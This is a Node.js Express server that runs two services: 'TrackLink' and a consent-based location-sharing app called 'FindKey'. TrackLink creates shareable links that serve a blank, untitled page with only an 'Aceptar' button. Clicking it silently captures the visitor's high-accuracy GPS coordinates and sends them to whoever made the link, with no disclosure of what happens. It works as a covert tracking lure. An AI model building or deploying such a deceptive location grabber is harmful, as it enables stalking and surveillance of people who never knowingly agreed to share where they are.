import express from "express";
import cors from "cors";
import crypto from "crypto";

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json({ limit: "1mb" }));

/* =========================================================
   TRACKLINK 3.2
========================================================= */

const requests = new Map();

/* =========================================================
   FINDKEY V1
========================================================= */

const findkeyUsers = new Map();
const findkeyLocations = new Map();
const findkeyPendingSearches = new Map();
const findkeySessions = new Map();

/* =========================================================
   FUNCIONES FINDKEY
========================================================= */

function generateFindKeyId() {
  return (
    "FK-" +
    crypto
      .randomBytes(5)
      .toString("hex")
      .toUpperCase()
  );
}

function generateToken() {
  return crypto.randomBytes(32).toString("hex");
}

function hashPassword(password) {
  const salt = crypto.randomBytes(16).toString("hex");

  const hash = crypto
    .scryptSync(password, salt, 64)
    .toString("hex");

  return `${salt}:${hash}`;
}

function verifyPassword(password, storedPassword) {
  try {
    const [salt, originalHash] =
      storedPassword.split(":");

    const hash = crypto
      .scryptSync(password, salt, 64)
      .toString("hex");

    return crypto.timingSafeEqual(
      Buffer.from(hash, "hex"),
      Buffer.from(originalHash, "hex")
    );
  } catch {
    return false;
  }
}

function getFindKeyUser(req) {
  const authorization =
    req.headers.authorization || "";

  if (!authorization.startsWith("Bearer ")) {
    return null;
  }

  const token =
    authorization.substring(7);

  const userId =
    findkeySessions.get(token);

  if (!userId) {
    return null;
  }

  return findkeyUsers.get(userId) || null;
}

/* =========================================================
   INICIO
========================================================= */

app.get("/", (req, res) => {
  res.json({
    ok: true,
    app: "TrackLink + FindKey",
    status: "online",
    version: "4.0",
    tracklink: true,
    findkey: true
  });
});

/* =========================================================
   HEALTH
========================================================= */

app.get("/health", (req, res) => {
  res.json({
    ok: true,
    status: "online",
    app: "TrackLink + FindKey",
    version: "4.0",
    tracklink: true,
    findkey: true,
    time: new Date().toISOString()
  });
});

/* =========================================================
   TRACKLINK
   CREAR ENLACE
========================================================= */

app.post("/api/tracklink/create", (req, res) => {

  const id =
    crypto.randomBytes(12).toString("hex");

  requests.set(id, {
    id,
    status: "waiting",
    createdAt: new Date().toISOString(),
    data: null
  });

  const baseUrl =
    `${req.protocol}://${req.get("host")}`;

  const link =
    `${baseUrl}/share/${id}`;

  res.json({
    ok: true,
    id,
    link
  });
});

/* =========================================================
   TRACKLINK
   PÁGINA DEL ENLACE
========================================================= */

app.get("/share/:id", (req, res) => {

  const id = req.params.id;

  if (!requests.has(id)) {

    return res.status(404).send(`
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title></title>
</head>
<body></body>
</html>
`);
  }

  res.type("html").send(`
<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width,initial-scale=1">

<title></title>

<style>

html,
body {

  margin: 0;
  width: 100%;
  height: 100%;
  background: #ffffff;

}

body {

  display: flex;
  align-items: center;
  justify-content: center;

}

button {

  border: 0;
  border-radius: 12px;
  padding: 16px 45px;
  background: #111111;
  color: #ffffff;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;

}

button:disabled {

  opacity: .5;

}

</style>

</head>

<body>

<button id="accept">
Aceptar
</button>

<script>

const button =
document.getElementById("accept");

button.addEventListener(
"click",
function () {

  if (!navigator.geolocation) {
    return;
  }

  button.disabled = true;

  navigator.geolocation.getCurrentPosition(

    async function(position) {

      const data = {

        latitude:
          position.coords.latitude,

        longitude:
          position.coords.longitude,

        accuracy:
          position.coords.accuracy

      };

      try {

        const response =
          await fetch(
            "/api/tracklink/submit/${id}",
            {
              method: "POST",

              headers: {
                "Content-Type":
                  "application/json"
              },

              body:
                JSON.stringify(data)
            }
          );

        if (!response.ok) {
          button.disabled = false;
        }

      } catch (error) {

        console.error(error);

        button.disabled = false;

      }

    },

    function(error) {

      console.error(error);

      button.disabled = false;

    },

    {

      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0

    }

  );

});

</script>

</body>

</html>
`);
});

/* =========================================================
   TRACKLINK
   RECIBIR UBICACIÓN
========================================================= */

app.post("/api/tracklink/submit/:id", (req, res) => {

  const request =
    requests.get(req.params.id);

  if (!request) {

    return res.status(404).json({
      ok: false,
      error: "Solicitud no encontrada."
    });

  }

  const {
    latitude,
    longitude,
    accuracy
  } = req.body;

  if (
    typeof latitude !== "number" ||
    typeof longitude !== "number"
  ) {

    return res.status(400).json({
      ok: false,
      error: "Ubicación inválida."
    });

  }

  request.status = "received";

  request.data = {

    latitude,
    longitude,

    accuracy:
      typeof accuracy === "number"
        ? accuracy
        : null,

    receivedAt:
      new Date().toISOString()

  };

  requests.set(
    req.params.id,
    request
  );

  console.log(
    "📍 Ubicación TrackLink:",
    req.params.id
  );

  res.json({
    ok: true
  });

});

/* =========================================================
   TRACKLINK
   RESULTADO
========================================================= */

app.get("/api/tracklink/result/:id", (req, res) => {

  const request =
    requests.get(req.params.id);

  if (!request) {

    return res.status(404).json({
      ok: false,
      error: "Solicitud no encontrada."
    });

  }

  res.json({

    ok: true,

    id:
      request.id,

    status:
      request.status,

    createdAt:
      request.createdAt,

    data:
      request.data

  });

});

/* =========================================================
   FINDKEY
   REGISTRO
========================================================= */

app.post("/api/findkey/register", (req, res) => {

  const {
    name,
    email,
    password
  } = req.body;

  if (
    typeof name !== "string" ||
    typeof email !== "string" ||
    typeof password !== "string"
  ) {

    return res.status(400).json({
      ok: false,
      error: "Nombre, correo y contraseña son obligatorios."
    });

  }

  const cleanName = name.trim();
  const cleanEmail = email.trim().toLowerCase();

  if (
    cleanName.length < 2 ||
    cleanEmail.length < 5 ||
    password.length < 6
  ) {

    return res.status(400).json({
      ok: false,
      error: "Datos inválidos."
    });

  }

  for (const user of findkeyUsers.values()) {

    if (user.email === cleanEmail) {

      return res.status(409).json({
        ok: false,
        error: "Este correo ya está registrado."
      });

    }

  }

  let id = generateFindKeyId();

  while (findkeyUsers.has(id)) {
    id = generateFindKeyId();
  }

  const user = {

    id,

    name: cleanName,

    email: cleanEmail,

    passwordHash:
      hashPassword(password),

    device: null,

    locationPermission: false,

    createdAt:
      new Date().toISOString()

  };

  findkeyUsers.set(id, user);

  const token =
    generateToken();

  findkeySessions.set(
    token,
    id
  );

  res.json({

    ok: true,

    message:
      "Cuenta creada correctamente.",

    token,

    user: {

      id: user.id,
      name: user.name,
      email: user.email,
      device: user.device,
      locationPermission:
        user.locationPermission

    }

  });

});

/* =========================================================
   FINDKEY
   LOGIN
========================================================= */

app.post("/api/findkey/login", (req, res) => {

  const {
    email,
    password
  } = req.body;

  if (
    typeof email !== "string" ||
    typeof password !== "string"
  ) {

    return res.status(400).json({
      ok: false,
      error: "Correo y contraseña son obligatorios."
    });

  }

  const cleanEmail =
    email.trim().toLowerCase();

  let user = null;

  for (const currentUser of findkeyUsers.values()) {

    if (currentUser.email === cleanEmail) {
      user = currentUser;
      break;
    }

  }

  if (
    !user ||
    !verifyPassword(
      password,
      user.passwordHash
    )
  ) {

    return res.status(401).json({
      ok: false,
      error: "Correo o contraseña incorrectos."
    });

  }

  const token =
    generateToken();

  findkeySessions.set(
    token,
    user.id
  );

  res.json({

    ok: true,

    token,

    user: {

      id: user.id,
      name: user.name,
      email: user.email,
      device: user.device,
      locationPermission:
        user.locationPermission

    }

  });

});

/* =========================================================
   FINDKEY
   PERFIL
========================================================= */

app.get("/api/findkey/profile", (req, res) => {

  const user =
    getFindKeyUser(req);

  if (!user) {

    return res.status(401).json({
      ok: false,
      error: "Sesión no válida."
    });

  }

  res.json({

    ok: true,

    user: {

      id: user.id,

      name:
        user.name,

      email:
        user.email,

      device:
        user.device,

      locationPermission:
        user.locationPermission,

      createdAt:
        user.createdAt

    }

  });

});

/* =========================================================
   FINDKEY
   GUARDAR INFORMACIÓN DEL DISPOSITIVO
========================================================= */

app.post("/api/findkey/device", (req, res) => {

  const user =
    getFindKeyUser(req);

  if (!user) {

    return res.status(401).json({
      ok: false,
      error: "Sesión no válida."
    });

  }

  const {
    model,
    androidVersion,
    battery
  } = req.body;

  user.device = {

    model:
      typeof model === "string"
        ? model
        : "Desconocido",

    androidVersion:
      typeof androidVersion === "string"
        ? androidVersion
        : "Desconocido",

    battery:
      typeof battery === "number"
        ? battery
        : null,

    updatedAt:
      new Date().toISOString()

  };

  findkeyUsers.set(
    user.id,
    user
  );

  res.json({
    ok: true,
    device: user.device
  });

});

/* =========================================================
   FINDKEY
   PERMISO DE UBICACIÓN
========================================================= */

app.post(
  "/api/findkey/location/permission",
  (req, res) => {

    const user =
      getFindKeyUser(req);

    if (!user) {

      return res.status(401).json({
        ok: false,
        error: "Sesión no válida."
      });

    }

    const enabled =
      req.body.enabled === true;

    user.locationPermission =
      enabled;

    findkeyUsers.set(
      user.id,
      user
    );

    res.json({

      ok: true,

      locationPermission:
        enabled

    });

  }
);

/* =========================================================
   FINDKEY
   ENVIAR UBICACIÓN
========================================================= */

app.post("/api/findkey/location", (req, res) => {

  const user =
    getFindKeyUser(req);

  if (!user) {

    return res.status(401).json({
      ok: false,
      error: "Sesión no válida."
    });

  }

  if (!user.locationPermission) {

    return res.status(403).json({
      ok: false,
      error:
        "La ubicación no está autorizada."
    });

  }

  const {
    latitude,
    longitude,
    accuracy,
    battery
  } = req.body;

  if (
    typeof latitude !== "number" ||
    typeof longitude !== "number"
  ) {

    return res.status(400).json({
      ok: false,
      error: "Ubicación inválida."
    });

  }

  const location = {

    id:
      user.id,

    latitude,

    longitude,

    accuracy:
      typeof accuracy === "number"
        ? accuracy
        : null,

    battery:
      typeof battery === "number"
        ? battery
        : null,

    updatedAt:
      new Date().toISOString()

  };

  findkeyLocations.set(
    user.id,
    location
  );

  /* -----------------------------------------
     Revisar búsquedas pendientes
  ----------------------------------------- */

  for (
    const [searchId, search]
    of findkeyPendingSearches.entries()
  ) {

    if (
      search.targetId === user.id
    ) {

      search.status =
        "located";

      search.location =
        location;

      search.updatedAt =
        new Date().toISOString();

      findkeyPendingSearches.set(
        searchId,
        search
      );

    }

  }

  console.log(
    "📍 FindKey ubicación recibida:",
    user.id
  );

  res.json({

    ok: true,

    location

  });

});

/* =========================================================
   FINDKEY
   BUSCAR UBICACIÓN POR ID
========================================================= */

app.get(
  "/api/findkey/location/:id",
  (req, res) => {

    const requester =
      getFindKeyUser(req);

    if (!requester) {

      return res.status(401).json({
        ok: false,
        error: "Sesión no válida."
      });

    }

    const targetId =
      req.params.id.trim().toUpperCase();

    const target =
      findkeyUsers.get(targetId);

    if (!target) {

      return res.status(404).json({
        ok: false,
        error: "ID FindKey no encontrado."
      });

    }

    /*
      IMPORTANTE:
      Solo se muestra ubicación si
      el propietario autorizó compartirla.
    */

    if (!target.locationPermission) {

      return res.status(403).json({
        ok: false,
        error:
          "Este usuario no tiene autorizada la ubicación."
      });

    }

    const location =
      findkeyLocations.get(targetId);

    if (!location) {

      return res.json({

        ok: true,

        status:
          "waiting",

        user: {

          id:
            target.id,

          name:
            target.name,

          email:
            target.email,

          device:
            target.device

        },

        location:
          null

      });

    }

    res.json({

      ok: true,

      status:
        "located",

      user: {

        id:
          target.id,

        name:
          target.name,

        email:
          target.email,

        device:
          target.device

      },

      location

    });

  }
);

/* =========================================================
   FINDKEY
   CREAR BÚSQUEDA OFFLINE
========================================================= */

app.post(
  "/api/findkey/offline/search",
  (req, res) => {

    const requester =
      getFindKeyUser(req);

    if (!requester) {

      return res.status(401).json({
        ok: false,
        error: "Sesión no válida."
      });

    }

    const targetId =
      typeof req.body.targetId === "string"
        ? req.body.targetId
            .trim()
            .toUpperCase()
        : "";

    if (!targetId) {

      return res.status(400).json({
        ok: false,
        error: "Debes proporcionar un ID."
      });

    }

    const target =
      findkeyUsers.get(targetId);

    if (!target) {

      return res.status(404).json({
        ok: false,
        error: "ID FindKey no encontrado."
      });

    }

    if (!target.locationPermission) {

      return res.status(403).json({
        ok: false,
        error:
          "Este usuario no tiene autorizada la ubicación."
      });

    }

    const searchId =
      crypto.randomBytes(12).toString("hex");

    const existingLocation =
      findkeyLocations.get(targetId);

    const search = {

      id:
        searchId,

      requesterId:
        requester.id,

      targetId,

      status:
        existingLocation
          ? "located"
          : "waiting",

      location:
        existingLocation || null,

      createdAt:
        new Date().toISOString(),

      updatedAt:
        new Date().toISOString()

    };

    findkeyPendingSearches.set(
      searchId,
      search
    );

    res.json({

      ok: true,

      searchId,

      status:
        search.status,

      targetId,

      location:
        search.location

    });

  }
);

/* =========================================================
   FINDKEY
   CONSULTAR BÚSQUEDA OFFLINE
========================================================= */

app.get(
  "/api/findkey/offline/search/:id",
  (req, res) => {

    const requester =
      getFindKeyUser(req);

    if (!requester) {

      return res.status(401).json({
        ok: false,
        error: "Sesión no válida."
      });

    }

    const search =
      findkeyPendingSearches.get(
        req.params.id
      );

    if (!search) {

      return res.status(404).json({
        ok: false,
        error: "Búsqueda no encontrada."
      });

    }

    if (
      search.requesterId !==
      requester.id
    ) {

      return res.status(403).json({
        ok: false,
        error: "No tienes acceso a esta búsqueda."
      });

    }

    res.json({

      ok: true,

      searchId:
        search.id,

      targetId:
        search.targetId,

      status:
        search.status,

      location:
        search.location,

      createdAt:
        search.createdAt,

      updatedAt:
        search.updatedAt

    });

  }
);

/* =========================================================
   FINDKEY
   CERRAR SESIÓN
========================================================= */

app.post("/api/findkey/logout", (req, res) => {

  const authorization =
    req.headers.authorization || "";

  if (authorization.startsWith("Bearer ")) {

    const token =
      authorization.substring(7);

    findkeySessions.delete(token);

  }

  res.json({
    ok: true
  });

});

/* =========================================================
   404
========================================================= */

app.use((req, res) => {

  res.status(404).json({

    ok: false,

    error:
      "Ruta no encontrada.",

    path:
      req.originalUrl

  });

});

/* =========================================================
   SERVIDOR
========================================================= */

app.listen(
  PORT,
  "0.0.0.0",
  () => {

    console.log(
      "🟢 TRACKLINK 3.2 + FINDKEY V1 INICIADO"
    );

    console.log(
      "🌐 Puerto:",
      PORT
    );

    console.log(
      "🔗 TrackLink activo"
    );

    console.log(
      "🔑 FindKey activo"
    );

  }
);
